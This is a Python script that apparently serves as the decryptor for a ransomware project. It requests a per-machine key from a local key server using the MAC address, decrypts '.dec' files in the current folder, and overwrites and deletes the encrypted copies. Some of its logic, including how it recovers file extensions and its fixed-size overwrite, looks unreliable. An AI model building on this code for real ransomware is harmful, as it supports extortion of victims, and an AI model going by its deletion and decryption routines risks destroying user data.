# %%
import os
import sys
import requests
import string 
import random
from getmac import get_mac_address as gma
from cryptography.fernet import Fernet

# %%
def secure_delete(file):
    #open file for writing
    with open(file, 'wb') as f:
        #overwrite the file with random data
        for i in range(25):
            data = ''.join(random.choice(string.printable) for _ in range(1024))
            f.write(data.encode('utf-8'))
    
    #delete the file
    os.remove(file)

# %%
response = requests.get('http://127.0.0.1:5000/keys/' + gma().replace(':','.'))
if response.status_code == 200:
    with open(gma().replace(':','.') + '.key', 'wb') as f:
        f.write(response.content)
else:
    print('File not found!')

# %%
file = gma().replace(':', '.') + '.key'

if not os.path.exists(file):
    sys.exit()
else:
    with open(file, 'rb') as f:
        key = f.read()
    fernet = Fernet(key)

# %%
def decrypt_file(file):
    #get encrypted data
    with open(file, 'rb') as infile:
        encrypted = infile.read()
    
    #decrypt the data
    original = fernet.decrypt(encrypted)
    with open(file, 'rb') as extfile:
        ext = extfile.readlines()[-1].decode('utf-8')
    
    #delete encrypted file
    secure_delete(file)

    file = os.path.splitext(file)[0] + ext

    #write decrypted data
    with open(file, 'wb') as outfile:
        outfile.write(original)

# %%
directory = os.getcwd()
files = []

for file in os.listdir(directory):
    if file.endswith('.dec'):
        files.append(os.path.join(directory, file))
print(files)

# %%
for file in files:
    decrypt_file(file)


